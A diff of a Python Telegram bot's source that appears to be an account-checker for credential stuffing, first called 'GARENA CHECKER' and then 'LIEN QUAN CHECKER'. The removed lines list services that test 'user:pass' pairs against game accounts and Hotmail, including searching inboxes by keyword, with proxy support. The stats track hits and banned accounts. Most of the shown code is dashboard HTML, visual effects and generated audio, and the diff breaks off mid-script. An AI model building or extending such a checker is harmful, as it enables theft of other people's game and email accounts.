@@ -1,16 +1,3 @@
-# ========================================================================
-#    GARENA CHECKER BOT V6.1 - HACKER EDITION - FIXED
-#    API: purchase.nhatminh301.com - VERSION 2.1
-# ========================================================================
-#    - HIEU UNG 3D + LASER + MATRIX
-#    - AM THANH TU DONG PHAT
-#    - KHONG LUU ACCOUNT
-#    - DA BO /hits VA /report
-#    - UI CAI TIEN VOI ICON THUC TE
-#    - NUT CHI TIET CHO TUNG SERVICE
-#    - FIX: API ENDPOINT PURCHASE.NHATMINH301.COM
-# ========================================================================
-
 import subprocess
 import sys
 import importlib
@@ -19,38 +6,33 @@ import time
 import json
 import os
 import re
-import telebot
-import requests
-import signal
 import struct
 import math
-import base64
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from collections import defaultdict
-import random
-import gc
 
 def install_package(package_name):
     try:
         importlib.import_module(package_name)
     except ImportError:
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
+            subprocess.check_call([sys.executable, "-m", "pip", "install",
+                                   package_name, "--no-cache-dir"])
         except:
             pass
 
 for pkg in ["requests", "pyTelegramBotAPI"]:
     install_package(pkg)
 
-import os as os_module
-import threading as threading_module
+import telebot
+import requests
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-# ========== BIEN TOAN CUC CHO AUDIO ==========
+# ========== AUDIO ==========
 CUSTOM_AUDIO_PATH = "custom_audio.wav"
 CUSTOM_AUDIO_DATA = None
 AUDIO_LOCK = threading.Lock()
+
 
 class RenderHandler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -58,8 +40,7 @@ class RenderHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
             self.end_headers()
-            html = self.generate_dashboard()
-            self.wfile.write(html.encode('utf-8'))
+            self.wfile.write(self.dashboard().encode('utf-8'))
         elif self.path == '/ping':
             self.send_response(200)
             self.end_headers()
@@ -68,483 +49,134 @@ class RenderHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'application/json; charset=utf-8')
             self.end_headers()
-            stats_json = json.dumps({
+            self.wfile.write(json.dumps({
                 "status": "alive",
                 "checking": checking,
                 "stats": stats,
-                "services": list(SERVICE_ROUTES.keys()),
                 "admin": ADMIN_USERNAME,
-                "version": "6.1",
-                "audio_custom": CUSTOM_AUDIO_DATA is not None
-            })
-            self.wfile.write(stats_json.encode('utf-8'))
-        elif self.path == '/api/services':
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json; charset=utf-8')
-            self.end_headers()
-            services_json = json.dumps(SERVICE_ROUTES)
-            self.wfile.write(services_json.encode('utf-8'))
-        elif self.path == '/audio':
+                "version": "9.0-auto-remove-ban"
+            }).encode('utf-8'))
+        elif self.path in ('/audio', '/audio.mp3'):
             self.send_response(200)
             self.send_header('Content-type', 'audio/wav')
             self.send_header('Cache-Control', 'no-cache')
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
-            audio_data = self.get_audio_data()
-            self.wfile.write(audio_data)
-        elif self.path == '/audio.mp3':
-            self.send_response(200)
-            self.send_header('Content-type', 'audio/mpeg')
-            self.send_header('Cache-Control', 'no-cache')
-            self.send_header('Access-Control-Allow-Origin', '*')
-            self.end_headers()
-            audio_data = self.get_audio_data()
-            self.wfile.write(audio_data)
+            self.wfile.write(self.get_audio())
         else:
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b"Bot is running!")
-    
-    def get_audio_data(self):
-        global CUSTOM_AUDIO_DATA
+
+    def get_audio(self):
         with AUDIO_LOCK:
             if CUSTOM_AUDIO_DATA:
                 return CUSTOM_AUDIO_DATA
-        return self.generate_default_audio()
-    
-    def generate_default_audio(self):
+        return self.default_audio()
+
+    def default_audio(self):
         try:
-            sample_rate = 44100
-            duration = 30.0
-            num_samples = int(sample_rate * duration)
-            
-            audio_buffer = bytearray()
-            for i in range(num_samples):
-                t = i / sample_rate
-                value = int(32767 * 0.3 * (
+            sr = 44100; dur = 30.0; n = int(sr * dur)
+            buf = bytearray()
+            for i in range(n):
+                t = i / sr
+                v = int(32767 * 0.3 * (
                     math.sin(2 * math.pi * 440 * t) * 0.4 +
                     math.sin(2 * math.pi * 554 * t) * 0.3 +
                     math.sin(2 * math.pi * 659 * t) * 0.2 +
                     math.sin(2 * math.pi * 880 * t) * 0.15 +
-                    math.sin(2 * math.pi * 1100 * t) * 0.1 +
-                    math.sin(2 * math.pi * 220 * t) * 0.2
-                ))
-                audio_buffer += struct.pack('<h', value)
-            
-            data_size = len(audio_buffer)
-            header = b'RIFF'
-            header += struct.pack('<I', 36 + data_size)
-            header += b'WAVE'
-            header += b'fmt '
-            header += struct.pack('<IHHIIHH', 16, 1, 1, sample_rate, sample_rate * 2, 2, 16)
-            header += b'data'
-            header += struct.pack('<I', data_size)
-            
-            return header + bytes(audio_buffer)
-        except Exception as e:
-            print(f"[!] Loi tao audio: {e}")
+                    math.sin(2 * math.pi * 220 * t) * 0.2))
+                buf += struct.pack('<h', v)
+            ds = len(buf)
+            h = b'RIFF' + struct.pack('<I', 36 + ds) + b'WAVE'
+            h += b'fmt ' + struct.pack('<IHHIIHH', 16, 1, 1, sr, sr * 2, 2, 16)
+            h += b'data' + struct.pack('<I', ds)
+            return h + bytes(buf)
+        except Exception:
             return b''
-    
-    def generate_dashboard(self):
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        uptime = time.time() - start_time if 'start_time' in globals() else 0
-        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
-        
-        hits_count = stats.get("hits", 0)
-        error_count = stats.get("errors", 0)
-        
-        bot_status = "Dang check" if checking else "San sang"
-        bot_color = "#ff9800" if checking else "#4caf50"
-        
-        services_html = ""
-        for key, value in SERVICE_ROUTES.items():
-            services_html += f"""
-            <div class="service-card" data-service="{key}" onclick="showServiceDetail('{key}')">
-                <div class="service-icon">{value['icon']}</div>
-                <div class="service-info">
-                    <div class="service-name">{key}</div>
-                    <div class="service-desc">{value['desc']}</div>
-                </div>
-                <div class="service-arrow">›</div>
-            </div>"""
-        
-        html_template = """<!DOCTYPE html>
-<html lang="vi">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GARENA CHECKER - HACKER EDITION</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@400;600;700&display=swap');
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: 'Inter', 'Orbitron', sans-serif; background: #0a0a0a; min-height: 100vh; color: #00ff00; overflow: hidden; user-select: none; }
-#bg-canvas, #matrix-canvas, #laser-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }
-#bg-canvas { z-index: 0; opacity: 0.25; }
-#matrix-canvas { z-index: 0; opacity: 0.12; }
-#laser-canvas { z-index: 1; pointer-events: none; }
-.container { position: relative; z-index: 2; max-width: 1100px; margin: 15px auto; padding: 20px; perspective: 1200px; max-height: 98vh; overflow-y: auto; }
-.container::-webkit-scrollbar { width: 4px; }
-.container::-webkit-scrollbar-track { background: rgba(0,255,0,0.05); }
-.container::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 10px; }
-.header { text-align: center; padding: 30px 25px; background: rgba(0,0,0,0.85); border-radius: 20px; border: 2px solid #00ff00; box-shadow: 0 0 50px rgba(0,255,0,0.15); position: relative; overflow: hidden; animation: float3d 6s ease-in-out infinite; }
-@keyframes float3d { 0%,100%{transform:rotateX(1deg) rotateY(1deg);} 50%{transform:rotateX(-1deg) rotateY(-1deg);} }
-.title { font-size: 2.8em; font-weight: 900; font-family: 'Orbitron', sans-serif; color: #00ff00; text-shadow: 0 0 20px rgba(0,255,0,0.8), 3px 3px 0 #ff00ff, -3px -3px 0 #00ffff; animation: glitch3d 3s infinite; letter-spacing: 2px; }
-@keyframes glitch3d { 0%,100%{transform:skew(0deg);} 20%{transform:skew(1.5deg);} 40%{transform:skew(-1.5deg);} 60%{transform:skew(1deg);} 80%{transform:skew(-1deg);} }
-.subtitle { font-size: 1em; color: #88ff88; letter-spacing: 3px; }
-.social-buttons { display: flex; justify-content: center; gap: 15px; margin-top: 15px; flex-wrap: wrap; }
-.social-btn { display: inline-flex; align-items: center; gap: 8px; padding: 10px 22px; border-radius: 50px; font-weight: 700; font-size: 0.85em; color: white; text-decoration: none; transition: all 0.4s; }
-.social-btn:hover { transform: scale(1.08); }
-.social-btn.tiktok { background: linear-gradient(135deg,#00f2ea,#ff0050); }
-.social-btn.telegram { background: linear-gradient(135deg,#0088cc,#004488); }
-.status-badge { display: inline-block; padding: 10px 25px; border-radius: 50px; font-weight: 700; font-size: 1em; margin-top: 12px; background: BOT_COLOR; color: white; animation: pulse3d 2s infinite; }
-@keyframes pulse3d { 0%,100%{transform:scale(1);} 50%{transform:scale(1.03);} }
-.audio-indicator { display: inline-block; padding: 6px 16px; border-radius: 50px; font-size: 0.8em; margin-top: 8px; background: rgba(0,255,0,0.1); border: 1px solid #00ff00; color: #00ff00; animation: audioPulse 1.5s infinite; }
-.audio-indicator .dot { display: inline-block; width: 8px; height: 8px; background: #00ff00; border-radius: 50%; margin-right: 8px; animation: dotPulse 1s infinite; }
-@keyframes audioPulse { 0%,100%{box-shadow:0 0 15px rgba(0,255,0,0.1);} 50%{box-shadow:0 0 30px rgba(0,255,0,0.3);} }
-@keyframes dotPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.6);} }
-.stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
-.stat-card { background: linear-gradient(145deg,rgba(0,255,0,0.04),rgba(0,0,0,0.8)); border-radius: 14px; padding: 20px 15px; text-align: center; border: 1px solid rgba(0,255,0,0.15); transition: all 0.5s; cursor: pointer; }
-.stat-card:hover { transform: scale(1.04); border-color: #00ff00; }
-.stat-value { font-size: 2.4em; font-weight: 900; font-family: 'Orbitron', sans-serif; }
-.stat-label { font-size: 0.7em; color: #88aa88; text-transform: uppercase; letter-spacing: 2px; }
-.stat-hits .stat-value { color: #00ff00; }
-.stat-error .stat-value { color: #ff6b35; }
-.stat-checked .stat-value { color: #00ccff; }
-.stat-time .stat-value { color: #ff00ff; font-size: 1.2em; }
-.section-title { font-size: 1.6em; text-align: center; margin: 25px 0 15px; font-family: 'Orbitron', sans-serif; letter-spacing: 2px; }
-.services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; margin-bottom: 20px; }
-.service-card { background: linear-gradient(145deg,rgba(0,255,0,0.04),rgba(0,0,0,0.7)); border-radius: 12px; padding: 16px 18px; display: flex; align-items: center; gap: 14px; border: 1px solid rgba(0,255,0,0.08); transition: all 0.4s; cursor: pointer; }
-.service-card:hover { transform: scale(1.04); border-color: #00ff00; box-shadow: 0 12px 35px rgba(0,255,0,0.15); }
-.service-icon { font-size: 2em; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; background: rgba(0,255,0,0.06); border-radius: 12px; }
-.service-info { flex:1; }
-.service-name { font-size:1em; font-weight:700; color:#fff; }
-.service-desc { font-size:0.7em; color:#88aa88; }
-.service-arrow { font-size:1.4em; color:#446644; transition:all 0.3s; }
-.service-card:hover .service-arrow { color:#00ff00; transform:translateX(5px); }
-.modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999; justify-content:center; align-items:center; backdrop-filter:blur(8px); }
-.modal-overlay.active { display:flex; }
-.modal-content { background:linear-gradient(145deg,#0a1a0a,#000); border:2px solid #00ff00; border-radius:20px; padding:35px 40px; max-width:500px; width:90%; box-shadow:0 0 60px rgba(0,255,0,0.2); position:relative; }
-.modal-close { position:absolute; top:15px; right:20px; font-size:1.8em; color:#ff4444; cursor:pointer; background:none; border:none; }
-.modal-close:hover { transform:rotate(90deg); color:#ff0000; }
-.modal-icon { font-size:4em; text-align:center; margin-bottom:10px; }
-.modal-title { font-size:1.8em; font-weight:700; text-align:center; color:#00ff00; margin-bottom:5px; font-family:'Orbitron',sans-serif; }
-.modal-desc { text-align:center; color:#88aa88; margin-bottom:20px; font-size:0.95em; }
-.modal-info { background:rgba(0,255,0,0.05); border-radius:10px; padding:15px 20px; border:1px solid rgba(0,255,0,0.1); margin-bottom:15px; }
-.modal-info-item { display:flex; justify-content:space-between; padding:5px 0; color:#aaa; font-size:0.85em; border-bottom:1px solid rgba(0,255,0,0.05); }
-.modal-info-item:last-child { border-bottom:none; }
-.modal-info-item span:last-child { color:#00ff00; font-weight:600; }
-.modal-command { background:rgba(0,0,0,0.5); border:1px solid rgba(0,255,0,0.2); border-radius:8px; padding:12px 15px; font-family:'Courier New',monospace; color:#00ff00; font-size:0.85em; word-break:break-all; margin-bottom:15px; }
-.modal-btn { display:block; width:100%; padding:12px; background:linear-gradient(135deg,#00ff00,#00cc00); border:none; border-radius:10px; color:#000; font-weight:700; font-size:1em; cursor:pointer; transition:all 0.3s; }
-.modal-btn:hover { transform:scale(1.03); box-shadow:0 0 30px rgba(0,255,0,0.4); }
-.footer { text-align:center; padding:15px; color:#446644; font-size:0.7em; border-top:1px solid rgba(0,255,0,0.06); margin-top:15px; }
-.footer a { color:#00ff00; text-decoration:none; }
-@media (max-width:768px) { .title { font-size:1.8em; } .stats-grid { grid-template-columns:repeat(2,1fr); gap:10px; } .services-grid { grid-template-columns:1fr; } .container { padding:10px; margin:10px; } .stat-value { font-size:1.8em; } }
-</style>
-</head>
-<body>
-<canvas id="bg-canvas"></canvas>
-<canvas id="matrix-canvas"></canvas>
-<canvas id="laser-canvas"></canvas>
-<div class="container">
-    <div class="header">
-        <div class="title">🎮 GARENA CHECKER</div>
-        <div class="subtitle">Version 6.1 - HACKER EDITION</div>
-        <div class="subtitle">Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;text-decoration:none;">@baohuyno1</a></div>
-        <div class="social-buttons">
-            <a href="https://tiktok.com/@baohuy1109" target="_blank" class="social-btn tiktok">🎵 TikTok @baohuy1109</a>
-            <a href="https://t.me/baohuyno1" target="_blank" class="social-btn telegram">✈️ Telegram</a>
-        </div>
-        <div class="status-badge" id="status-badge" style="background: BOT_COLOR;">🔴 San sang</div>
-        <div class="audio-indicator"><span class="dot"></span> 🔊 AM THANH DANG PHAT</div>
-        <div class="subtitle" style="font-size:0.7em;color:#446644;margin-top:5px;">⏱ Uptime: UPTIME_PLACEHOLDER</div>
-    </div>
-    <div class="stats-grid">
-        <div class="stat-card stat-hits"><div class="stat-value">HITS_PLACEHOLDER</div><div class="stat-label">✅ Hits</div></div>
-        <div class="stat-card stat-error"><div class="stat-value">ERROR_PLACEHOLDER</div><div class="stat-label">⚠️ Errors</div></div>
-        <div class="stat-card stat-checked"><div class="stat-value">CHECKED_PLACEHOLDER</div><div class="stat-label">🔄 Checked</div></div>
-        <div class="stat-card stat-time"><div class="stat-value">CURRENT_TIME_PLACEHOLDER</div><div class="stat-label">📅 Thoi gian</div></div>
-    </div>
-    <div class="section-title">📋 DICH VU HO TRO</div>
-    <div class="services-grid">SERVICES_HTML_PLACEHOLDER</div>
-    <div class="footer">
-        <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> - All rights reserved</p>
-        <p style="color:#334433;font-size:0.65em;">⚡ HACKER EDITION - 3D EFFECTS - AUTO AUDIO</p>
-    </div>
-</div>
-<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this) closeModal()">
-    <div class="modal-content">
-        <button class="modal-close" onclick="closeModal()">✕</button>
-        <div class="modal-icon" id="modalIcon">🎮</div>
-        <div class="modal-title" id="modalTitle">Service</div>
-        <div class="modal-desc" id="modalDesc">Description</div>
-        <div class="modal-info">
-            <div class="modal-info-item"><span>📌 Service ID</span><span id="modalId">-</span></div>
-            <div class="modal-info-item"><span>🔗 API Route</span><span id="modalRoute">-</span></div>
-            <div class="modal-info-item"><span>📝 Parameters</span><span id="modalParams">tk, mk</span></div>
-        </div>
-        <div class="modal-command" id="modalCommand">/check user:pass service</div>
-        <button class="modal-btn" onclick="closeModal()">✅ OK, TOI HIEU</button>
-    </div>
-</div>
-<audio id="bg-audio" loop autoplay>
-    <source src="/audio" type="audio/wav">
-    <source src="/audio.mp3" type="audio/mpeg">
-</audio>
-<script>
-const bgCanvas = document.getElementById('bg-canvas');
-const bgCtx = bgCanvas.getContext('2d');
-bgCanvas.width = window.innerWidth;
-bgCanvas.height = window.innerHeight;
-let particles = [];
-class Particle {
-    constructor() { this.reset(); }
-    reset() {
-        this.x = Math.random() * bgCanvas.width;
-        this.y = Math.random() * bgCanvas.height;
-        this.z = Math.random() * 300 + 50;
-        this.size = Math.random() * 3 + 1;
-        this.speed = Math.random() * 0.5 + 0.1;
-        this.color = `hsl(${120 + Math.random() * 60}, 100%, ${40 + Math.random() * 30}%)`;
-        this.opacity = Math.random() * 0.8 + 0.2;
-    }
-    update() {
-        this.z -= this.speed;
-        if (this.z < 10) this.reset();
-        const scale = 300 / this.z;
-        this.sx = this.x * scale + bgCanvas.width/2 - this.x;
-        this.sy = this.y * scale + bgCanvas.height/2 - this.y;
-        this.ssize = this.size * scale;
-    }
-    draw(ctx) {
-        ctx.fillStyle = this.color;
-        ctx.globalAlpha = this.opacity * (300 / this.z);
-        ctx.beginPath();
-        ctx.arc(this.sx, this.sy, this.ssize, 0, Math.PI * 2);
-        ctx.fill();
-        ctx.globalAlpha = 1;
-    }
-}
-for (let i = 0; i < 120; i++) { particles.push(new Particle()); }
-function drawBg() {
-    bgCtx.fillStyle = 'rgba(10,10,10,0.3)';
-    bgCtx.fillRect(0,0,bgCanvas.width,bgCanvas.height);
-    for (const p of particles) { p.update(); p.draw(bgCtx); }
-    requestAnimationFrame(drawBg);
-}
-drawBg();
-const matrixCanvas = document.getElementById('matrix-canvas');
-const matrixCtx = matrixCanvas.getContext('2d');
-matrixCanvas.width = window.innerWidth;
-matrixCanvas.height = window.innerHeight;
-const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}[]|;:,.<>?~';
-const fontSize = 13;
-const columns = Math.ceil(matrixCanvas.width / fontSize);
-const drops = [];
-for (let i = 0; i < columns; i++) { drops[i] = Math.random() * -100; }
-function drawMatrix() {
-    matrixCtx.fillStyle = 'rgba(0,0,0,0.05)';
-    matrixCtx.fillRect(0,0,matrixCanvas.width,matrixCanvas.height);
-    for (let i = 0; i < drops.length; i++) {
-        const text = chars[Math.floor(Math.random() * chars.length)];
-        const bright = Math.random() > 0.92 ? '#ffffff' : '#00ff00';
-        matrixCtx.fillStyle = bright;
-        matrixCtx.font = fontSize + 'px monospace';
-        matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) { drops[i] = 0; }
-        drops[i]++;
-    }
-}
-setInterval(drawMatrix, 50);
-const laserCanvas = document.getElementById('laser-canvas');
-const laserCtx = laserCanvas.getContext('2d');
-laserCanvas.width = window.innerWidth;
-laserCanvas.height = window.innerHeight;
-const laserColors = ['#00ff00','#00ffff','#ff00ff','#ffff00','#ff4444','#44ff44','#ff8800'];
-let lasers = [];
-class LaserBeam {
-    constructor(x,y) {
-        this.x = x || Math.random() * laserCanvas.width;
-        this.y = y || Math.random() * laserCanvas.height;
-        this.tx = Math.random() * laserCanvas.width;
-        this.ty = Math.random() * laserCanvas.height;
-        this.color = laserColors[Math.floor(Math.random() * laserColors.length)];
-        this.width = Math.random() * 2 + 0.5;
-        this.life = 0;
-        this.maxLife = Math.random() * 60 + 30;
-        this.particles = [];
-    }
-    update() {
-        this.life++;
-        if (Math.random() > 0.4) {
-            this.particles.push({
-                x: this.x + (this.tx - this.x) * Math.random(),
-                y: this.y + (this.ty - this.y) * Math.random(),
-                vx: (Math.random() - 0.5) * 2,
-                vy: (Math.random() - 0.5) * 2,
-                life: 0,
-                maxLife: Math.random() * 20 + 10
-            });
-        }
-        for (let i = this.particles.length - 1; i >= 0; i--) {
-            const p = this.particles[i];
-            p.x += p.vx; p.y += p.vy; p.life++;
-            if (p.life > p.maxLife) this.particles.splice(i, 1);
-        }
-        if (this.life > this.maxLife) {
-            const idx = lasers.indexOf(this);
-            if (idx > -1) lasers.splice(idx, 1);
-        }
-    }
-    draw(ctx) {
-        const progress = this.life / this.maxLife;
-        const alpha = progress < 0.1 ? progress * 10 : progress > 0.9 ? (1 - progress) * 10 : 1;
-        const grad = ctx.createLinearGradient(this.x, this.y, this.tx, this.ty);
-        grad.addColorStop(0, this.color + '00');
-        grad.addColorStop(0.5, this.color + 'FF');
-        grad.addColorStop(1, this.color + '00');
-        ctx.strokeStyle = grad;
-        ctx.lineWidth = this.width;
-        ctx.globalAlpha = alpha;
-        ctx.shadowColor = this.color;
-        ctx.shadowBlur = 12;
-        ctx.beginPath();
-        ctx.moveTo(this.x, this.y);
-        ctx.lineTo(this.tx, this.ty);
-        ctx.stroke();
-        ctx.shadowBlur = 0;
-        for (const p of this.particles) {
-            const pa = 1 - (p.life / p.maxLife);
-            ctx.fillStyle = this.color;
-            ctx.globalAlpha = pa * alpha;
-            ctx.beginPath();
-            ctx.arc(p.x, p.y, Math.random() * 2 + 1, 0, Math.PI * 2);
-            ctx.fill();
-        }
-        ctx.globalAlpha = 1;
-    }
-}
-function createLaser(x,y) { if (lasers.length < 80) lasers.push(new LaserBeam(x,y)); }
-function drawLasers() {
-    laserCtx.clearRect(0,0,laserCanvas.width,laserCanvas.height);
-    for (const l of lasers) { l.update(); l.draw(laserCtx); }
-    if (Math.random() > 0.97) {
-        const fx = Math.random() * laserCanvas.width;
-        const fy = Math.random() * laserCanvas.height;
-        const fr = Math.random() * 35 + 15;
-        const fc = laserColors[Math.floor(Math.random() * laserColors.length)];
-        const g = laserCtx.createRadialGradient(fx, fy, 0, fx, fy, fr);
-        g.addColorStop(0, fc + 'FF');
-        g.addColorStop(1, fc + '00');
-        laserCtx.fillStyle = g;
-        laserCtx.beginPath();
-        laserCtx.arc(fx, fy, fr, 0, Math.PI * 2);
-        laserCtx.fill();
-    }
-    requestAnimationFrame(drawLasers);
-}
-for (let i = 0; i < 15; i++) createLaser();
-drawLasers();
-document.addEventListener('mousemove', function(e) {
-    if (Math.random() > 0.88) { createLaser(e.clientX, e.clientY); if (lasers.length > 80) lasers.shift(); }
-});
-document.addEventListener('click', function(e) {
-    for (let i = 0; i < 6; i++) { createLaser(e.clientX, e.clientY); }
-    if (lasers.length > 80) lasers.splice(0, 6);
-});
-const audio = document.getElementById('bg-audio');
-function playAudioDirect() {
-    audio.volume = 0.25;
-    audio.loop = true;
-    audio.play().catch(e => { console.log('Auto-play blocked'); });
-}
-setTimeout(playAudioDirect, 300);
-setInterval(() => { if (audio.paused && !audio.ended) { audio.play().catch(() => {}); } }, 5000);
-function updateStats() {
-    fetch('/stats').then(r=>r.json()).then(d=>{
-        document.querySelector('.stat-hits .stat-value').textContent = d.stats?.hits || 0;
-        document.querySelector('.stat-error .stat-value').textContent = d.stats?.errors || 0;
-        document.querySelector('.stat-checked .stat-value').textContent = d.stats?.checked || 0;
-        document.querySelector('.stat-time .stat-value').textContent = new Date().toLocaleTimeString('vi-VN');
-        const badge = document.getElementById('status-badge');
-        badge.textContent = d.checking ? '🔴 Dang check' : '🟢 San sang';
-        badge.style.background = d.checking ? '#ff9800' : '#4caf50';
-    }).catch(e=>console.log(e));
-}
-setInterval(updateStats, 5000);
-updateStats();
-const serviceData = {
-    "lienquan": { icon:"🎮", name:"Lien Quan", desc:"Check tai khoan Lien Quan + FC Online", route:"/api/lienquan", params:"tk, mk, proxy (tuá»³ chá»n)", command:"/check user:pass lienquan" },
-    "miniworld": { icon:"🌍", name:"Mini World", desc:"Check tai khoan Mini World", route:"/api/miniworld", params:"tk, mk", command:"/check user:pass miniworld" },
-    "blockmango": { icon:"🧱", name:"Blockman Go", desc:"Check tai khoan Blockman Go", route:"/api/blockmango", params:"tk (uid), mk", command:"/check user:pass blockmango" },
-    "deltaforce": { icon:"🔫", name:"Delta Force", desc:"Check tai khoan Delta Force (qua Garena SSO)", route:"/api/deltaforce", params:"tk, mk, proxy (tuá»³ chá»n)", command:"/check user:pass deltaforce" },
-    "hotmail": { icon:"📧", name:"Hotmail", desc:"Check Hotmail + tÃ¬m email trong inbox", route:"/api/hotmail", params:"tk, mk, keyword", command:"/check user:pass hotmail" },
-    "fc": { icon:"⚽", name:"FC Online", desc:"Check tai khoan FC Online riÃªng", route:"/api/fc", params:"tk, mk, proxy (tuá»³ chá»n)", command:"/check user:pass fc" },
-    "fullpack": { icon:"📦", name:"Fullpack", desc:"Check táº¥t cáº£ service qua Garena", route:"/api/fullpack", params:"tk, mk, proxy (tuá»³ chá»n)", command:"/check user:pass fullpack" }
-};
-function showServiceDetail(key) {
-    const data = serviceData[key];
-    if (!data) return;
-    document.getElementById('modalIcon').textContent = data.icon;
-    document.getElementById('modalTitle').textContent = data.name;
-    document.getElementById('modalDesc').textContent = data.desc;
-    document.getElementById('modalId').textContent = key;
-    document.getElementById('modalRoute').textContent = data.route;
-    document.getElementById('modalParams').textContent = data.params;
-    document.getElementById('modalCommand').textContent = data.command;
-    document.getElementById('modalOverlay').classList.add('active');
-}
-function closeModal() { document.getElementById('modalOverlay').classList.remove('active'); }
-document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });
-window.addEventListener('resize', () => {
-    bgCanvas.width = window.innerWidth;
-    bgCanvas.height = window.innerHeight;
-    matrixCanvas.width = window.innerWidth;
-    matrixCanvas.height = window.innerHeight;
-    laserCanvas.width = window.innerWidth;
-    laserCanvas.height = window.innerHeight;
-});
-</script>
-</body>
-</html>"""
-        
-        html = html_template.replace('BOT_COLOR', bot_color)
-        html = html.replace('UPTIME_PLACEHOLDER', uptime_str)
-        html = html.replace('HITS_PLACEHOLDER', str(hits_count))
-        html = html.replace('ERROR_PLACEHOLDER', str(error_count))
-        html = html.replace('CHECKED_PLACEHOLDER', str(stats.get('checked', 0)))
-        html = html.replace('CURRENT_TIME_PLACEHOLDER', current_time)
-        html = html.replace('SERVICES_HTML_PLACEHOLDER', services_html)
-        
-        return html
-    
-    def log_message(self, format, *args):
+
+    def dashboard(self):
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        up = time.time() - start_time if 'start_time' in globals() else 0
+        up_str = time.strftime("%H:%M:%S", time.gmtime(up))
+        bc = "#ff9800" if checking else "#4caf50"
+        stt = "Dang check" if checking else "San sang"
+        return f"""<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>LIEN QUAN CHECKER V9</title><style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:'Orbitron',monospace;background:#0a0a0a;color:#0f0;
+min-height:100vh;overflow-x:hidden}}
+#mx{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.15}}
+.w{{position:relative;z-index:1;max-width:900px;margin:20px auto;padding:20px}}
+.h{{background:rgba(0,0,0,0.85);border:2px solid #0f0;border-radius:18px;
+padding:28px;text-align:center;box-shadow:0 0 50px rgba(0,255,0,0.15)}}
+.t{{font-size:2.4em;font-weight:900;color:#0f0;text-shadow:0 0 20px rgba(0,255,0,0.8)}}
+.s{{color:#8f8;font-size:0.9em;letter-spacing:3px;margin-top:6px}}
+.b{{display:inline-block;padding:10px 25px;border-radius:50px;background:{bc};
+color:#fff;font-weight:700;margin-top:14px}}
+.g{{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:20px 0}}
+.c{{background:linear-gradient(145deg,rgba(0,255,0,0.05),rgba(0,0,0,0.8));
+border:1px solid rgba(0,255,0,0.2);border-radius:14px;padding:18px;text-align:center}}
+.v{{font-size:2.2em;font-weight:900;color:#0f0}}
+.l{{font-size:0.7em;color:#8a8;text-transform:uppercase;margin-top:6px}}
+.v.b{{color:#f63}} .v.c{{color:#0cf}} .v.t{{color:#f0f;font-size:1.1em}}
+@media(max-width:768px){{.t{{font-size:1.7em}}.g{{grid-template-columns:repeat(2,1fr)}}}}
+</style></head><body><canvas id="mx"></canvas><div class="w"><div class="h">
+<div class="t">🎮 LIEN QUAN CHECKER</div>
+<div class="s">V9.0 - AUTO REMOVE BANNED</div>
+<div class="s">Admin: @{ADMIN_USERNAME}</div>
+<div class="b">{stt}</div></div>
+<div class="g">
+<div class="c"><div class="v">{stats.get('hits',0)}</div><div class="l">✅ Hits</div></div>
+<div class="c"><div class="v b">{stats.get('banned',0)}</div><div class="l">🚫 Banned</div></div>
+<div class="c"><div class="v c">{stats.get('clean',0)}</div><div class="l">🟢 Clean</div></div>
+<div class="c"><div class="v t">{now}</div><div class="l">📅 Time</div></div>
+</div></div><audio loop autoplay><source src="/audio"></audio>
+<script>const c=document.getElementById('mx'),x=c.getContext('2d');
+c.width=innerWidth;c.height=innerHeight;const ch='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+const f=14,co=Math.ceil(c.width/f),d=[];
+for(let i=0;i<co;i++)d[i]=Math.random()*-100;
+setInterval(()=>{{x.fillStyle='rgba(0,0,0,0.05)';x.fillRect(0,0,c.width,c.height);
+for(let i=0;i<d.length;i++){{const t=ch[Math.floor(Math.random()*ch.length)];
+x.fillStyle=Math.random()>0.92?'#fff':'#0f0';x.font=f+'px monospace';
+x.fillText(t,i*f,d[i]*f);if(d[i]*f>c.height&&Math.random()>0.975)d[i]=0;d[i]++;}}}},50);
+addEventListener('resize',()=>{{c.width=innerWidth;c.height=innerHeight}});
+const au=document.querySelector('audio');au.volume=0.25;
+setInterval(()=>{{if(au.paused)au.play().catch(()=>{{}})}},5000);
